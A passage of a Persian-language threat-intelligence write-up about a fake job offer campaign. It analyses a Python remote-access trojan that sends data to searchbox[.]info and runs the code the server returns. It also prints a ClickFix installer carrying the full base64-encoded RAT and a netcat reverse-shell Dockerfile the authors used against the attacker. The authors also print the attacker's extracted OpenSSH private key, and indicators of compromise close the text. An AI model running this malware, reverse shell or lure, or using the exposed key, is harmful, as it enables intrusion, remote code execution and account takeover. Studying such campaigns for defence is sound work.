        if szResponse == "Succeed!":
            time.sleep(20)
            continue
        lpContentEnc = base64.b64decode(szResponse)
        lpContent = xor_encrypt_decrypt(lpContentEnc, Key)
        block_copy(lpContent, 0, lpCmdID, 0, 4)
        block_copy(lpContent, 4, lpDataLen, 0, 4)
        nCMDID = struct.unpack('<i',lpCmdID)[0]
        nDataLen = struct.unpack('<i',lpDataLen)[0]
        lpData = bytearray(nDataLen)
        block_copy(lpContent, 8, lpData, 0, nDataLen)
        lpData = encrypt_decrypt(lpData, 123)
        szCode = lpData.decode('utf-8')

        #szCodeArr[0] = szCode
        if nCMDID == 1001:
            exec(szCode)
            continue
        if nCMDID == 1002:
            time.sleep(60)
            continue
        continue
    except Exception as e:
        continue
    time.sleep(20)

kbeps = "weeg"
```
در هر چرخه، بسته ی درخواست ساخته و به https://searchbox[.]info/prefer.php ارسال میشه. پاسخ دریافتی اگه دقیقا «Succeed!» باشه، نقش زنده نگه داشتن کانکشن رو داره و بدافزار ۲۰ ثانیه مکث می کنه و دوباره یه درخواست به سرور میفرسته. در غیر اینصورت، ابتدا از Base64-decoding، لایه ی بیرونی داده‌ی دریافت شده با XOR کلید ۱۶بایتی باز می شه. 

فرمت کلی پاسخ سرور این شکلیه:

```
b64( XOR16( [ 4B CMDID|LE ][ 4B DATALEN|LE ][ DATALEN bytes payload ] ) )
```

هدر پاسخ ۸ بایت طول داره: ۴ بایت اول شناسه ی دستور (nCMDID) و ۴ بایت بعدی طول داده (nDataLen). بعد به اندازه ی nDataLen بایت داده بعد از هدر برداشته می شه، با کلید  ۱۲۳ **(**0x7B**)**  XOR  میشه و به UTF-8 تبدیل میشه. خروجی هم باید کد پایتون باشه. اگر nCMDID برابر 1001 باشد، همین کد با exec روی سیستم اجرا میشه. اگر 1002 باشد، ۶۰ ثانیه مکث میکنه. 

### **جمع بندی**

این بدافزار یه RAT مینیمال، اما واقعا کار راه انداز هست. با هر بار بیکون زدن(beacon)، یه بسته ی متنی شامل شناسه‌ی کمپین، شناسه‌ی ۱۲حرفی کلاینت و داده‌ی رمزشده به C2 می‌فرسته. پاسخ رو توی دو لایه XOR باز می‌کنه و در صورت نیاز، متن دریافتی رو مستقیما با exec اجرا می‌کنه. نبود ماژول های جانبی به معنی محدود بودن تهدید نیست؛ چون با یه دستور 1001، هر قابلیتی میشه در لحظه روی عامل قربانی تزریق و اجرا بشه. خلاصه به محض برقراری ارتباط موفق، مهاجم اختیار کامل اجرای کد روی سیستم رو داره. 

<p align=center>

![](like.jpg)

</p>

خب اینجا من دیگه یه شناخت کافی از اسکریپت و نقشه‌ی مهاجم دستم اومد. یکمی فکر کردم که چیکارا میشه کرد و اصلا چقدر دیگه روش وقت بزارم. به نظرم رسید خوبه که سعی کنم مهاجم رو توی تله بندازم و یکمی گوش مالیش بدم. پس یه نقشه کشیدم، با همون ایده‌ای که مهاجم اومد سراغ‌مون برم سراغش. نقشم این بود بهش بگم که آقا من کار رو آماده کردم ولی به بهونه‌ی پایدار نبودن اینترنت ایران، فیلترینگ و کمی ساده لوح جلوه دادن خودم بهش بگم حاجی بیا وصل شو خودت به سیستمم تست بگیر. بهش بگم کلید sshت رو بده و من بزارم توی سیستم توهم بفرما بیا داخل😂. 

## **بازی برعکس: فریب مهاجم با Dockerfile**

از اینجا به بعد یکی از بچه های تیم رو صدا کردم که باهم بریم سراغش. تصمیم گرفتیم از همون ترفند خودش علیه خودش استفاده کنیم. چون از ما Dockerfile خواسته بود، یک ایمیج درست کردیم که در واقع به محض اجرا به ما reverse shell می داد.

```bash
while true; do rm /tmp/f 2>/dev/null; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 3000 > /tmp/f; sleep 5; done
```

منیفست ایمیج‌مون این شکلی شد:


```
Dockerfile
FROM alpine:latest
RUN apk add --no-cache netcat-openbsd
ENV KEY="d2hpbGUgdHJ1ZTsgZG8gcm0gL3RtcC9mIDI+L2Rldi9udWxsOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgc2ggLWkgMj4mMSB8IG5jIDEuMi4zLjQgMzAwMCA+IC90bXAvZjsgc2xlZXAgNTsgZG9uZQ=="
```

همین طور این ایمیج باید طوری ران می شد که موقع اجرا کل مسیر **"/"** سیستم عامل قربانی رو هم داخل کانتینر مونت می کرد، یعنی عملاً ما دسترسی مستقیم به فایل سیستمش پیدا می کردیم.

```bash
sudo docker run -v /:/host -it --rm xyz9045/84.26.14.40
```

اگه دقت کنید اسم ایمیج رو طوری انتخاب کردیم که شبیه یه آدرس آیپی شده **84.26.14.40** تا فکر کنه واقعا داره به این ماشین وصل میشه! این آیپی رو همین طوری رندوم انتخاب کردیم.

خلاصه توی مکالممون توی تلگرام خرش کردیم؛ من براش نوشتم: 
<kbd> 
«آقا اینترنت ایران داغونه، بیا مستقیم روی سیستم من وصل شو، خودت خروجی پروژه رو بررسی کن.»
</kbd>

اونور اون هم حسابی ذوق کرده بود و کلید عمومی SSH خودش رو فرستاد:

```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCgIROy2BYmbTwhp/TWnkmFHIigCrioS6Wl3yd2n8KNm7mB/D6Ino0VqdT92LRD8ryaIFEYKKPoBt7giDMjrITql3gx8apIk8SM+3+ub6cEiNJZqyM9emRQSl4BKYXV5FqSdRlGGY49+IQLl2B+jh7Gc3wpJTI5Aot9zn+hEKnB+i6Tb+n+U6+hep6QYtCIAL+gM+JKYui1L13klf/CXxy7PWt6nOnFih/PwxKAWBrE4O96/fFfSyBiXt1iiG0hY/FyM2uD9EHg2H1oWxmBhHVtByehYZmHFyi7kpCkLONXwSA4vAUqGPk2VB8Vvf3leb1yJHtEoIDAf9r//cWV2fkAMD8vuZThLJD4yBpYX24DgvvK/ZNVcakSTTvog2Tv0V347iVLufyaPgIaCKls3m0mjaSd0wJTaB6RaEz388ii98NHF1WAaXS06K8pJ//94eD1vVb6sJh9tqJupbVpieUzRSZVTGK7nyxg0edC9H56NHoaEiEXL2Vvs5/fDpTQbwLtQRRRQnVdcrF4/W/n/XopWFsHOfl5E/xlesIbVtWWekLx8sf447U8osjiXnY8FJobdPv70gknORRjEyLfy0J7y99JRH26yJTcssw8o1wGQdFm8DtmUgxDT3q3mfigtYyEAk6irIN0chqDjGWIiUUGY4pOUNM5wSWdypGUZ9oLqw== harryking940610@gmail.com
```

![مهاجم کلید عمومی sshش رو فرستاد](pub.png)


برای اینکه دفعه‌ی اول بتونه وصل شه و اعتمادش جلب شه تصمیم گرفتیم روی سندباکس‌مون یه SSH اکسس موقت ولی توی هانی‌پات بهش بدیم. ما هم هانی‌پات [Cowrie](https://github.com/cowrie/cowrie) بالا آوردیم. یارو وقتی سعی می‌کرد وارد شه (5.223.53[.]161 ایپیش این بود)، فکر می‌کرد واقعاً روی ماشین من هست! 

![تلاش مهاجم برای اتصال به هانی پات](cowrie.png)


بعدش توی تلگرام پیام داد که آقا وصل نمیشه. اینجا دیگه قربانی کاملا آماده بود که طعمه‌ای که براش گذاشته بودیم رو گاز بگیره! یه جمله سرهم کردم که بیا این کامند رو بزن اصلا وصل‌شو به سیستم من دیگه فیلترینگ و فایروال اینارو بایپیس کن:

```bash
$ sudo docker run -v /:/host -it --rm xyz9045/84.26.14.40
```

یکمی شک کرد گفت واقعا داکر؟ گفتم بله بزن وصلی میشی. نتیجه؟ کامند رو زد و ما از سیستمش reverse shell گرفتیم. 

![دسترسی از vm مهاجم](ac1.png)


![دسترسی از vm مهاجم](ac2.png)


سریع چندتا کامند زدیم و یه سری خروجی رو چک کردیم و دیدیم که خب یکمی محافظه کار هست و اینو توی یکی از VMهایی که به عنوان VPN Serverش هست اجرا کرده. در نهایت برای اطمینان، private keyش رو هم بیرون کشیدیم:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

برای اطمینان تست کردیم که آیا اون public key که به ما داد و این private key جفت هستند یا خیر:

```bash
$ [ "$(ssh-keygen -y -f key \
    | ssh-keygen -lf - \
    | awk '{print $2}')" = "$(ssh-keygen -lf key.pub \
    | awk '{print $2}')" ] \
&& echo "MATCH" \
|| echo "NO MATCH"

MATCH
```

بله، کلید خودش بود 😈. داشتیم پلن می کردیم که دسترسی مون رو Persist کنیم که کانکشن رو قطع کرد. در کل فکر میکنم کمتر از یک دقیقه بیشتر دسترسی نداشتیم بهش.  
چون خیلی سریع و بی برنامه جلو رفتیم و قصد خرابکاری هم نداشتیم، کارمون کمی نامنظم پیش رفت و البته چون از داخل ایران نمیشه این موارد رو پیگیری قانونی کرد خیلی پلن خاصی نداشتیم. ولی خب الان که این متن رو دارم می نویسم، با خودم میگم ای کاش یک درس عبرت درست و حسابی بهش می دادیم.

## **ادامه ماجرا: نقشه ی جدید مهاجم**

بعد از اینکه شل بسته شد، شروع کرد غر زدن که:  
«آقا من وصل نشدم چی شد؟»

منم گفتم: «احتمالاً به خاطر اینترنت و فایرواله. یه بار دیگه بزن تست کنیم.»  
ولی به نظر می‌رسید یکمی شک کرده بود، چون دوباره کامند رو نزد. ما هم بیخیال شدیم؛ دیده بودیم که ماشینی که ازش دسترسی گرفته بودیم، فقط یه VM بوده که احتمالاً به عنوان یکی از پراکسی هاش استفاده میکنه. البته احتمالا میشد از همونجا به داده های بدرد بخورتری برسیم.

خلاصه بعد از چند ساعت تصمیم گرفتیم دوباره روی مخش کار کنیم. براش نوشتیم که:  
«حاجی بیا وصل شو، وقت ما رو تلف کردی، خیلی نامردی پیچوندی مارو!»

این بار گفت: «اصلاً بیا بریم Google Meet صحبت کنیم.»  
ما اول فکر کردیم واقعاً می خواد با یه ترفند بیاد توی جلسه و بعد مثلا مارو ببره به سمتی که RATش رو فعال کنیم. گفتیم باشه که اون وسط ها دوباره بهش پولتیک بزنیم تا اون بازم کامند دلخواه ما رو ران کنه. 

یه لینک فرستاد:
```
https://meet.google.join-uk[.]com/ygt-mnek-hwm
```

به‌به، یه Typosquatting روی دامنه ی Google Meet! اینجا دیگه خیلی تابلو شد که نقشه‌ی جدیدی در کاره. ولی نقشه‌اش چی می تونه باشه؟ لینک رو باز نکردم ولی یه curl زدم ببینم محتوای این صفحه چیه، و دیدم بله… استاد دنبال click-fix زدن روی ماست. 

![پیلود clickfix](clickfix.png)


> حالا click-fix چیه؟ یه توضیح مختصرش اینه توی مدل جدیدی از فیشینگ به اسم click-fix، سایت قلابی خودش رو جای سرویس هایی مثل Google Meet میزنه و به کاربر خطای ساختگی نشون میده: مثلاً میگه "میکروفون یا دوربینت مشکل داره، نمیتونی جوین بشی". بعد یه دکمه ی "Fix" میذاره که با زدنش دستورالعمل میده، مثلاً یه خط powershell یا bash آماده. کاربر هم فکر میکنه این راه حل رسمیه و همون رو توی ترمینال اجرا میکنه، در حالی که داره بدافزار رو با دست خودش نصب میکنه.

پیلود رو باز کردیم و بررسی کردیم. دستور به این شکل بود:

```bash
$ echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWtmc1NMIGh0dHBzOi8vbWVldC5nb29nbGUuam9pbi11ay5jb20vc3VwcG9ydC9hdWRpb19kcml2ZXJfaW5zdGFsbGVyLnNoK
SI=' | base64 -d 

/bin/bash -c "$(curl -kfsSL https://meet.google.join-uk[.]com/support/audio_driver_installer.sh)"
```

بعد فایل audio_driver_installer.sh رو دانلود و باز کردیم:
```python
#!/bin/bash

PYTHON=$(command -v python3 || command -v python)

if [ -z "$PYTHON" ]; then
    exit 1
fi

TMP_PY_SCRIPT=$(mktemp /tmp/systems-private-3f27e703481c43aab27860c1df4e14b1XXXX)

cat << 'EOF' > "$TMP_PY_SCRIPT"
import sys
import os
import string
import urllib.request
import urllib.error
import http.client
import json
import struct
import time
import array
import socket
import ctypes
import ctypes as ct
import os.path
import subprocess
import platform
from ctypes import wintypes as w
from pathlib import Path
import base64
import threading
import random
import ssl

error_de = "YUtPID0gImFkZndlZndlZndlIg0KdXJsID0gImh0dHA6Ly9zZWFyY2hib3guaW5mby9wcmVmZXIucGhwIg0KDQo="
din_dat = "dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9pam9udmJ6MWF6eHNkd3dhYXF6dncyMzRld3hjdm5vcHJ0d3F4diINCktleSA9IGJ5dGVhcnJheShbMywgNiwgMiwgMSwgNiwgMCwgNCwgNywgMCwgMSwgOSwgNiwgOCwgMSwgMiwgNV0pDQpkZWYgR2V0T2JqSUQoKToNCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sZXR0ZXJzKSBmb3IgeCBpbiByYW5nZSgxMikpDQpkZWYgR2V0T1NTdHJpbmcoKToNCiAgICByZXR1cm4gcGxhdGZvcm0ucGxhdGZvcm0oKQ0Kc3pPYmplY3RJRCA9IEdldE9iaklEKCkNCnN6UENvZGUgPSAiT3BlcmF0aW5nIFN5c3RlbSA6ICIgKyBHZXRPU1N0cmluZygpDQpzekNvbXB1dGVyTmFtZSA9ICJDb21wdXRlciBOYW1lIDogIiArIHNvY2tldC5nZXRob3N0bmFtZSgpDQpkZWYgeG9yX2VuY3J5cHRfZGVjcnlwdChkYXRhLCBrZXkpOg0KICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpDQogICAgZm9yIGkgaW4gcmFuZ2UobGVuKGRhdGEpKToNCiAgICAgICAgcmVzdWx0LmFwcGVuZChkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0pDQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkNCmRlZiBnZXRfYnl0ZXNfZnJvbV91bmljb2RlKHRleHQsIGVuY29kaW5nID0gJ3V0Zi0xNmxlJyk6DQogICAgcmV0dXJuIHRleHQuZW5jb2RlKGVuY29kaW5nKQ0KZGVmIEhUVFBfUE9TVCh1cmwsIGRhdGEpOg0KICAgIHVzZXJfYWdlbnQgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2Ig0KICAgIGVuY29kZWRfZGF0YSA9IGRhdGEuZW5jb2RlKCd1dGYtOCcpDQogICAgY29udGV4dCA9IHNzbC5fY3JlYXRlX3VudmVyaWZpZWRfY29udGV4dCgpDQogICAgbl9yZXF1ZXN0ID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZW5jb2RlZF9kYXRhKQ0KICAgIG5fcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgdXNlcl9hZ2VudCkNCg0KICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihuX3JlcXVlc3QsIGNvbnRleHQ9Y29udGV4dCwgdGltZW91dCA9IDYwKSBhcyByZXNwb25zZToNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykNCmRlZiBNYWtlUmVxdWVzdFBhY2tldChzekNvbnRlbnRzKToNCiAgICBzekNJRCA9ICJGRDQyOURFQUJFIg0KICAgIHN6U3RlcCA9ICJcclxuXHRcdFN0ZXAxIDogS2VlcExpbmsoUClcclxuIg0KICAgIGxzelJlcXVlc3QgPSBiIiINCiAgICBscFJlcXVlc3QgPSBieXRlYXJyYXkoKQ0KICAgIGxwUmVxdWVzdEVuYyA9IGJ5dGVhcnJheSgpDQogICAgaWYgbGVuKHN6Q29udGVudHMpID09IDA6DQogICAgICAgIHN6RGF0YSA9IHN6U3RlcCArIHN6UENvZGUgKyAiXHJcbiIgKyBzekNvbXB1dGVyTmFtZSArICJcclxuIiArIHN6Q29udGVudHMNCiAgICBlbHNlOg0KICAgICAgICBzekRhdGEgPSBzekNvbnRlbnRzDQogICAgbHN6UmVxdWVzdCA9ICJpZD0iICsgc3pDSUQgKyAiJm9pZD0iICsgc3pPYmplY3RJRCArICImZGF0YT0iDQogICAgbHBSZXF1ZXN0ID0gZ2V0X2J5dGVzX2Zyb21fdW5pY29kZShzekRhdGEpDQogICAgbHBSZXF1ZXN0RW5jID0geG9yX2VuY3J5cHRfZGVjcnlwdChscFJlcXVlc3QsS2V5KQ0KICAgIHN6YjY0RGF0YSA9IGJhc2U2NC5iNjRlbmNvZGUobHBSZXF1ZXN0RW5jKS5kZWNvZGUoKQ0KICAgIGxzelJlcXVlc3QgKz0gc3piNjREYXRhDQogICAgcmV0dXJuIGxzelJlcXVlc3QNCmRlZiBlbmNyeXB0X2RlY3J5cHQoZGF0YTogYnl0ZXMsIGtleTogaW50KSAtPiBieXRlczoNCiAgICByZXN1bHQgPSBieXRlYXJyYXkoKQ0KICAgIGZvciBieXRlIGluIGRhdGE6DQogICAgICAgIGVuY3J5cHRlZF9ieXRlID0gYnl0ZSBeIGtleQ0KICAgICAgICByZXN1bHQuYXBwZW5kKGVuY3J5cHRlZF9ieXRlKQ0KICAgIHJldHVybiBieXRlcyhyZXN1bHQpDQpkZWYgYmxvY2tfY29weShzb3VyY2UsIHNvdXJjZV9vZmZzZXQsIGRlc3RpbmF0aW9uLCBkZXN0aW5hdGlvbl9vZmZzZXQsIGNvdW50KToNCiAgICBmb3IgaSBpbiByYW5nZShjb3VudCk6DQogICAgICAgIGRlc3RpbmF0aW9uW2Rlc3RpbmF0aW9uX29mZnNldCArIGldID0gc291cmNlW3NvdXJjZV9vZmZzZXQgKyBpXQ0Kc3pDb250ZW50cyA9ICIiDQp3aGlsZSBUcnVlOg0KICAgIGxwQ21kSUQgPSBieXRlYXJyYXkoNCkNCiAgICBscERhdGFMZW4gPSBieXRlYXJyYXkoNCkNCiAgICBuQ01ESUQgPSAwDQogICAgbkRhdGFMZW4gPSAwDQogICAgbkxlbiA9IDANCiAgICBzekNvZGUgPSAiIg0KICAgIHN6Q29kZUFyciA9IFsibmV3IHN0cmluZyJdDQogICAgc3pSZXF1ZXN0ID0gIiINCiAgICBzelJlc3BvbnNlID0gIiINCiAgICBscENvbnRlbnQgPSBieXRlYXJyYXkoKQ0KICAgIGxwRGF0YSA9IGJ5dGVhcnJheSgpDQogICAgbHBDb250ZW50RW5jID1ieXRlYXJyYXkoKQ0KICAgIHRyeToNCiAgICAgICAgc3pSZXF1ZXN0ID0gTWFrZVJlcXVlc3RQYWNrZXQoc3pDb250ZW50cykNCiAgICAgICAgc3pDb250ZW50cyA9ICIiDQogICAgICAgIHN6UmVzcG9uc2UgPSBIVFRQX1BPU1QodXJsLCBzelJlcXVlc3QpDQogICAgICAgIA0KICAgICAgICBzelJlc3BvbnNlID0gc3pSZXNwb25zZS5yZXBsYWNlKCcgJywgJysnKQ0KICAgICAgICBpZiBzelJlc3BvbnNlID09ICJTdWNjZWVkISI6DQogICAgICAgICAgICB0aW1lLnNsZWVwKDIwKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbHBDb250ZW50RW5jID0gYmFzZTY0LmI2NGRlY29kZShzelJlc3BvbnNlKQ0KICAgICAgICBscENvbnRlbnQgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGxwQ29udGVudEVuYywgS2V5KQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgMCwgbHBDbWRJRCwgMCwgNCkNCiAgICAgICAgYmxvY2tfY29weShscENvbnRlbnQsIDQsIGxwRGF0YUxlbiwgMCwgNCkNCiAgICAgICAgbkNNRElEID0gc3RydWN0LnVucGFjaygnPGknLGxwQ21kSUQpWzBdDQogICAgICAgIG5EYXRhTGVuID0gc3RydWN0LnVucGFjaygnPGknLGxwRGF0YUxlbilbMF0NCiAgICAgICAgbHBEYXRhID0gYnl0ZWFycmF5KG5EYXRhTGVuKQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgOCwgbHBEYXRhLCAwLCBuRGF0YUxlbikNCiAgICAgICAgbHBEYXRhID0gZW5jcnlwdF9kZWNyeXB0KGxwRGF0YSwgMTIzKQ0KICAgICAgICBzekNvZGUgPSBscERhdGEuZGVjb2RlKCd1dGYtOCcpDQogICAgICAgIA0KICAgICAgICAjc3pDb2RlQXJyWzBdID0gc3pDb2RlDQogICAgICAgIGlmIG5DTURJRCA9PSAxMDAxOg0KICAgICAgICAgICAgZXhlYyhzekNvZGUpDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBpZiBuQ01ESUQgPT0gMTAwMjoNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNjApDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBjb250aW51ZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgY29udGludWUNCiAgICB0aW1lLnNsZWVwKDIwKQ0Ka2JlcHMgPSAid2VlZyI="
sdat = base64.b64decode(error_de)
if(sdat==""):
    sdat = is_url_valid(sdat)
kerrs = sdat + base64.b64decode("Cg==")
kerrs += base64.b64decode(din_dat)
exec(kerrs)
EOF

nohup "$PYTHON" "$TMP_PY_SCRIPT" > nohup.out 2>&1 &
```

که در واقع همون [RAT](#تحلیل-اسکریپت-مخرب) قبلی با همون مکانیزم های توضیح داده شده، رو دوباره روی سیستم قربانی اجرا می کرد.

## **جمع بندی**

شاید مهمترین پیام این ماجرا یه هشدار جدی باشه که "**مراقب باشیم**". چون این مدل از تاکتیک های مهندسی اجتماعی، بخصوص از طریق پیشنهادهای کار جعلی، به صورت قارچ گونه در حال رشدن. درسته که این حمله‌ها لزوما کار گروه های هکری دولتی (nation-state actors) نیست، اما جامعه‌ی خیلی بزرگی از تبهکارهای سایبری وجود داره که فعالانه دارن از این تکنیک‌های جدید برای فریب افراد استفاده میکنن. اینها با خلاقیت، از پروژه های تستی آلوده گرفته تا کلاهبرداری های فیشینگ، از اعتماد و انگیزه‌ی برنامه نویس‌ها سو استفاده می‌کنن تا به اهدافشون برسن. پس حفظ هوشیاری و داشتن شک و تردید منطقی در برابر هر پیشنهاد ناخواسته، دیگه فقط یک توصیه نیست!، بلکه یه سپر دفاعی ضروری در مقابل این تهدیدها محسوب میشه.

## **شاخص های تهدید (IOCs)**

*   **دامنه ها**
    
<div dir=ltr>
VPN: 5.223.53[.]161  

netupdates[.]info → 45.61.139[.]22

searchbox[.]info → 162.33.177[.]48

withharry[.]pro → 162.33.177[.]47

meet.google.join-uk[.]com → 144.172.103[.]23
</div>

*   **ایمیل**
    
<div dir=ltr>

 harryking940610@gmail[.]com

nicholasharper000@gmail[.]com

</div>

*   **فایل ها**
    
<div dir=ltr>

chartflow_analysis_deploy.zip → sha1: ee0d6cc029f90a7a0b18c8c9980c906d3cef5cbb

audio_driver_installer.sh → sha1: 5de93beec432a5271deca2a91343bd669cc553e8

password: as2025

[https://github.com/miladbr/Threat-Intel-Writeups/tree/main/Operation-Fake-Job](https://github.com/miladbr/Threat-Intel-Writeups/tree/main/Operation-Fake-Job)

</div>

*   **حساب ها**
    


<div dir=ltr>
Twitter: [https://x.com/HarryK1ng62657](https://x.com/HarryK1ng62657)

Twitter: [https://x.com/HarperNich46559/](https://x.com/HarperNich46559/)

GitHub: [https://github.com/HarryKingWork](https://github.com/HarryKingWork)
</div>
</div>